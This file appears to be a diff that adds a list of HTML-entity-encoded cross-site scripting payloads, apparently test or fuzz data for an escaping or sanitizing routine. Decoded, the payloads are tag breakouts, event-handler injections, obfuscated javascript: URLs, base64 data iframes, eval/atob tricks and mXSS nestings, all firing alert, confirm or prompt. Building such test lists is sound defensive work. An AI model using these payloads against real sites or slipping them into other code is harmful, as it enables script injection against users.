+&#60;&#47;&#116;&#105;&#116;&#108;&#101;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#116;&#105;&#116;&#108;&#101;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#60;&#47;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#47;&#47;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#60;&#105;&#109;&#103;&#47;&#115;&#114;&#99;&#61;&#120;&#47;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#34;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#34;&#62;
+&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#39;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#39;&#62;
+&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#47;&#47;
+&#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#96;&#49;&#96;&#62;
+&#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#96;&#49;&#96;&#62;
+&#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#96;&#49;&#96;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#34;&#32;&#32;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#34;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#34;&#32;&#9;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#34;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#34;&#74;&#97;&#86;&#97;&#83;&#99;&#82;&#105;&#80;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#34;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#34;&#106;&#97;&#118;&#97;&#38;&#35;&#49;&#49;&#53;&#59;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#34;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#34;&#106;&#97;&#118;&#97;&#38;&#35;&#120;&#48;&#57;&#59;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#34;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&#34;&#92;&#120;&#54;&#97;&#92;&#120;&#54;&#49;&#92;&#120;&#55;&#54;&#92;&#120;&#54;&#49;&#92;&#120;&#55;&#51;&#92;&#120;&#54;&#51;&#92;&#120;&#55;&#50;&#92;&#120;&#54;&#57;&#92;&#120;&#55;&#48;&#92;&#120;&#55;&#52;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#34;&#62;&#120;&#60;&#47;&#97;&#62;
+&#60;&#102;&#111;&#114;&#109;&#62;&#60;&#98;&#117;&#116;&#116;&#111;&#110;&#32;&#102;&#111;&#114;&#109;&#97;&#99;&#116;&#105;&#111;&#110;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#120;&#60;&#47;&#98;&#117;&#116;&#116;&#111;&#110;&#62;&#60;&#47;&#102;&#111;&#114;&#109;&#62;
+&#60;&#102;&#111;&#114;&#109;&#62;&#60;&#98;&#117;&#116;&#116;&#111;&#110;&#32;&#102;&#111;&#114;&#109;&#97;&#99;&#116;&#105;&#111;&#110;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#120;&#60;&#47;&#98;&#117;&#116;&#116;&#111;&#110;&#62;&#60;&#47;&#102;&#111;&#114;&#109;&#62;
+&#60;&#102;&#111;&#114;&#109;&#62;&#60;&#98;&#117;&#116;&#116;&#111;&#110;&#32;&#102;&#111;&#114;&#109;&#97;&#99;&#116;&#105;&#111;&#110;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#120;&#60;&#47;&#98;&#117;&#116;&#116;&#111;&#110;&#62;&#60;&#47;&#102;&#111;&#114;&#109;&#62;
+&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;&#60;&#47;&#105;&#102;&#114;&#97;&#109;&#101;&#62;
+&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;&#60;&#47;&#105;&#102;&#114;&#97;&#109;&#101;&#62;
+&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;&#60;&#47;&#105;&#102;&#114;&#97;&#109;&#101;&#62;
+&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#59;&#98;&#97;&#115;&#101;&#54;&#52;&#44;&#80;&#72;&#78;&#106;&#99;&#109;&#108;&#119;&#100;&#68;&#53;&#104;&#98;&#71;&#86;&#121;&#100;&#67;&#103;&#120;&#75;&#84;&#119;&#118;&#99;&#50;&#78;&#121;&#97;&#88;&#66;&#48;&#80;&#103;&#61;&#61;&#34;&#62;&#60;&#47;&#105;&#102;&#114;&#97;&#109;&#101;&#62;
+&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#59;&#98;&#97;&#115;&#101;&#54;&#52;&#44;&#80;&#72;&#78;&#106;&#99;&#109;&#108;&#119;&#100;&#68;&#53;&#106;&#98;&#50;&#53;&#109;&#97;&#88;&#74;&#116;&#75;&#68;&#69;&#112;&#80;&#67;&#57;&#122;&#89;&#51;&#74;&#112;&#99;&#72;&#81;&#43;&#34;&#62;&#60;&#47;&#105;&#102;&#114;&#97;&#109;&#101;&#62;
+&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#59;&#98;&#97;&#115;&#101;&#54;&#52;&#44;&#80;&#72;&#78;&#106;&#99;&#109;&#108;&#119;&#100;&#68;&#53;&#119;&#99;&#109;&#57;&#116;&#99;&#72;&#81;&#111;&#77;&#83;&#107;&#56;&#76;&#51;&#78;&#106;&#99;&#109;&#108;&#119;&#100;&#68;&#52;&#61;&#34;&#62;&#60;&#47;&#105;&#102;&#114;&#97;&#109;&#101;&#62;
+&#60;&#120;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#111;&#118;&#101;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#104;&#111;&#118;&#101;&#114;
+&#60;&#120;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#101;&#110;&#116;&#101;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#104;&#111;&#118;&#101;&#114;
+&#60;&#120;&#32;&#111;&#110;&#112;&#111;&#105;&#110;&#116;&#101;&#114;&#111;&#118;&#101;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#104;&#111;&#118;&#101;&#114;
+&#60;&#120;&#32;&#111;&#110;&#99;&#108;&#105;&#99;&#107;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#99;&#108;&#105;&#99;&#107;
+&#60;&#120;&#32;&#111;&#110;&#100;&#98;&#108;&#99;&#108;&#105;&#99;&#107;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#99;&#108;&#105;&#99;&#107;
+&#60;&#120;&#32;&#111;&#110;&#112;&#111;&#105;&#110;&#116;&#101;&#114;&#100;&#111;&#119;&#110;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#99;&#108;&#105;&#99;&#107;
+&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#62;
+&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#62;
+&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#62;
+&#99;&#97;&#108;&#108;&#98;&#97;&#99;&#107;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#47;&#47;
+&#99;&#97;&#108;&#108;&#98;&#97;&#99;&#107;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#59;
+&#99;&#97;&#108;&#108;&#98;&#97;&#99;&#107;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#47;&#47;
+&#125;&#41;&#40;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#41;&#47;&#47;
+&#125;&#41;&#40;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#41;&#47;&#47;
+&#125;&#41;&#40;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#41;&#47;&#47;
+&#36;&#123;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#125;
+&#36;&#123;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#125;
+&#36;&#123;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#125;
+&#70;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#96;&#97;&#108;&#101;&#114;&#116;&#92;&#120;&#50;&#56;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#92;&#120;&#50;&#57;&#96;&#40;&#41;
+&#70;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#96;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#92;&#120;&#50;&#56;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#92;&#120;&#50;&#57;&#96;&#40;&#41;
+&#70;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#96;&#112;&#114;&#111;&#109;&#112;&#116;&#92;&#120;&#50;&#56;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#92;&#120;&#50;&#57;&#96;&#40;&#41;
+&#91;&#93;&#46;&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;&#46;&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;&#40;&#39;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#39;&#41;&#40;&#41;
+&#91;&#93;&#46;&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;&#46;&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;&#40;&#39;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#39;&#41;&#40;&#41;
+&#91;&#93;&#46;&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;&#46;&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;&#40;&#39;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#39;&#41;&#40;&#41;
+&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#39;&#89;&#87;&#120;&#108;&#99;&#110;&#81;&#111;&#77;&#83;&#107;&#61;&#39;&#41;&#41;
+&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#39;&#89;&#50;&#57;&#117;&#90;&#109;&#108;&#121;&#98;&#83;&#103;&#120;&#75;&#81;&#61;&#61;&#39;&#41;&#41;
+&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#39;&#99;&#72;&#74;&#118;&#98;&#88;&#66;&#48;&#75;&#68;&#69;&#112;&#39;&#41;&#41;
+&#101;&#118;&#97;&#108;&#40;&#39;&#92;&#120;&#54;&#49;&#92;&#120;&#54;&#99;&#92;&#120;&#54;&#53;&#92;&#120;&#55;&#50;&#92;&#120;&#55;&#52;&#40;&#92;&#120;&#51;&#49;&#41;&#39;&#41;
+&#101;&#118;&#97;&#108;&#40;&#39;&#92;&#120;&#54;&#51;&#92;&#120;&#54;&#102;&#92;&#120;&#54;&#101;&#92;&#120;&#54;&#54;&#92;&#120;&#54;&#57;&#92;&#120;&#55;&#50;&#92;&#120;&#54;&#100;&#40;&#92;&#120;&#51;&#49;&#41;&#39;&#41;
+&#101;&#118;&#97;&#108;&#40;&#39;&#92;&#120;&#55;&#48;&#92;&#120;&#55;&#50;&#92;&#120;&#54;&#102;&#92;&#120;&#54;&#100;&#92;&#120;&#55;&#48;&#92;&#120;&#55;&#52;&#40;&#92;&#120;&#51;&#49;&#41;&#39;&#41;
+&#60;&#115;&#118;&#103;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#47;&#115;&#118;&#103;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#47;&#115;&#118;&#103;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#47;&#115;&#118;&#103;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#32;&#111;&#110;&#98;&#101;&#103;&#105;&#110;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#97;&#116;&#116;&#114;&#105;&#98;&#117;&#116;&#101;&#78;&#97;&#109;&#101;&#61;&#120;&#32;&#100;&#117;&#114;&#61;&#49;&#115;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#32;&#111;&#110;&#98;&#101;&#103;&#105;&#110;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#32;&#97;&#116;&#116;&#114;&#105;&#98;&#117;&#116;&#101;&#78;&#97;&#109;&#101;&#61;&#120;&#32;&#100;&#117;&#114;&#61;&#49;&#115;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#32;&#111;&#110;&#98;&#101;&#103;&#105;&#110;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#32;&#97;&#116;&#116;&#114;&#105;&#98;&#117;&#116;&#101;&#78;&#97;&#109;&#101;&#61;&#120;&#32;&#100;&#117;&#114;&#61;&#49;&#115;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#115;&#101;&#116;&#32;&#111;&#110;&#98;&#101;&#103;&#105;&#110;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#97;&#116;&#116;&#114;&#105;&#98;&#117;&#116;&#101;&#78;&#97;&#109;&#101;&#61;&#120;&#32;&#116;&#111;&#61;&#49;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#115;&#101;&#116;&#32;&#111;&#110;&#98;&#101;&#103;&#105;&#110;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#32;&#97;&#116;&#116;&#114;&#105;&#98;&#117;&#116;&#101;&#78;&#97;&#109;&#101;&#61;&#120;&#32;&#116;&#111;&#61;&#49;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#115;&#101;&#116;&#32;&#111;&#110;&#98;&#101;&#103;&#105;&#110;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#32;&#97;&#116;&#116;&#114;&#105;&#98;&#117;&#116;&#101;&#78;&#97;&#109;&#101;&#61;&#120;&#32;&#116;&#111;&#61;&#49;&#62;
+&#60;&#109;&#97;&#116;&#104;&#62;&#60;&#109;&#116;&#101;&#120;&#116;&#62;&#60;&#116;&#97;&#98;&#108;&#101;&#62;&#60;&#109;&#103;&#108;&#121;&#112;&#104;&#62;&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#33;&#45;&#45;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#60;&#109;&#97;&#116;&#104;&#62;&#60;&#109;&#116;&#101;&#120;&#116;&#62;&#60;&#116;&#97;&#98;&#108;&#101;&#62;&#60;&#109;&#103;&#108;&#121;&#112;&#104;&#62;&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#33;&#45;&#45;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#60;&#109;&#97;&#116;&#104;&#62;&#60;&#109;&#116;&#101;&#120;&#116;&#62;&#60;&#116;&#97;&#98;&#108;&#101;&#62;&#60;&#109;&#103;&#108;&#121;&#112;&#104;&#62;&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#33;&#45;&#45;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#60;&#33;&#45;&#45;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#45;&#45;&#62;
+&#60;&#33;&#45;&#45;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#45;&#45;&#62;
+&#60;&#33;&#45;&#45;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#45;&#45;&#62;
+&#45;&#45;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#45;&#45;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#45;&#45;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#60;&#109;&#101;&#116;&#97;&#32;&#104;&#116;&#116;&#112;&#45;&#101;&#113;&#117;&#105;&#118;&#61;&#114;&#101;&#102;&#114;&#101;&#115;&#104;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#61;&#34;&#48;&#59;&#117;&#114;&#108;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#34;&#62;
